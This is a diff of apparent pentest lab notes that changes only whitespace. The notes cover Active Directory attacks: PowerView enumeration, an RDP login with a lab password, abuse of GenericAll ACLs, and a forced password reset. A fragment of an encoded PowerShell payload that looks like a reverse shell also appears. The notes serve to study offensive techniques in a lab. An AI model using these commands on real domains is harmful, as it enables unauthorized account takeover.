@@ -4328,17 +4328,17 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
 - Enumerating OS
   - `powershell -ep bypass`  
   - `Import-Module .\PowerView.ps1`  
-  - What is the DistinguishedName for the WEB04 machine > CN=web04,CN=Computers,DC=corp,DC=com
+  - What is the DistinguishedName for the WEB04 machine > CN=web04,CN=Computers,DC=corp,DC=com  
     `Get-NetComputer -Name WEB04 | select distinguishedname`  
-  - What is the exact operating system version for FILES04 > 10.0 (20348)
-    `Get-NetComputer -Name FILES04 | select operatingsystem, operatingsystemversion`  
+  - What is the exact operating system version for FILES04 > 10.0 (20348)  
+    `Get-NetComputer -Name FILES04 | select operatingsystem, operatingsystemversion`    
     `Get-NetComputer | select name, operatingsystem, operatingsystemversion`   
-- Getting overview of permissions and logged on users
-  - Find out which new machine has administrative privileges  
-    `Find-LocalAdminAccess`
+- Getting overview of permissions and logged on users  
+  - Find out which new machine has administrative privileges    
+    `Find-LocalAdminAccess`  
     `xfreerdp3 /u:stephanie /p:'LegmanTeamBenzoin!!' /d:corp.com /v:192.168.154.72 /cert:ignore /drive:share,/home/kali/share`  
 - capstones (Misconfigured GenericAll access)
-  - Find ACL misconfigurations (GenericAll-can reset password without knowing old one)/ Bloodhount > robert  
+  - Find ACL misconfigurations (GenericAll-can reset password without knowing old one)/ Bloodhount > robert   
     `Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft`
   - Reset Robert’s password  
     `Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)`
